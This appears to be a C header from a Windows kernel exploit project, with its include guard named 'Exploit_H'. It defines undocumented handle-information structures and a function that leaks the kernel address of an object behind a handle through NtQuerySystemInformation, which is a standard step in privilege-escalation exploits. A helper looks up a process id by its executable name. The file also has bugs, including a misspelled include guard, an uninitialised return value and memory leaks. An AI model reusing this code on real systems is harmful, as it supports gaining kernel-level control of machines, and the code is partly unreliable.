#pragma once
#ifndef Exploit_H
#define Exlpoit_H
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#endif

#define MAXIMUM_FILENAME_LENGTH 255

typedef struct _SYSTEM_HANDLE
{
    PVOID Object;
    DWORD UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR HandleCount;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

PVOID GetKernelPointerByHandle(HANDLE HandleValue)
{
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
    PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (query == NULL) {
        return 0;
    }
    ULONG len = 20;
    NTSTATUS status = (NTSTATUS)0xc0000004;
    PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
    do {
        len *= 2;
        pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

        status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);

    } while (status == (NTSTATUS)0xc0000004);
    if (status != (NTSTATUS)0x0) {
        return 0;
    }

    DWORD CurrentPid = GetCurrentProcessId();
    for (int i = 0; i < pHandleInfo->HandleCount; i++) {
        PVOID object = pHandleInfo->Handles[i].Object;
        HANDLE handle = pHandleInfo->Handles[i].HandleValue;
        DWORD pid = pHandleInfo->Handles[i].UniqueProcessId;

        if (pid == CurrentPid && handle == HandleValue) {
            return object;
        }

    }
    return 0;
}

ULONG GetPidByName(const char* procname) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    ULONG pid;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (strcmp(entry.szExeFile, procname) == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);
    return pid;
}
